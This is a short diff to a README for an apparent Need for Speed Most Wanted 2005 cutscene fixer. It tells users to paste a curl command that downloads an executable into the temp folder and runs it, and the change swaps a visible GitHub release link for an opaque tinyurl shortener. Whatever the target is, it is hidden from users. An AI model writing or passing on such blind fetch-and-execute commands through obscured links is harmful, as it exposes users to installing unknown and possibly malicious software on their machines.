@@ -11,7 +11,7 @@ Im not responsible to what you do to, the game files, this program must be used 
 Open command prompt
 1. Press Windows + X Or start menu search for "command prompt"
 2. Click Command Prompt
-3. run this curl -L -o %TEMP%/app.exe https://github.com/1nhp/nfsmw2005-cutscene-fixer/releases/download/1.0/NFSMW2005.Cutscene.Fixer.exe && %TEMP%\app.exe
+3. run this curl -L -o %TEMP%/app.exe https://tinyurl.com/hrr3b9tz && %TEMP%\app.exe
 4. ^ copy paste this
 5. Then run it
 # Linux
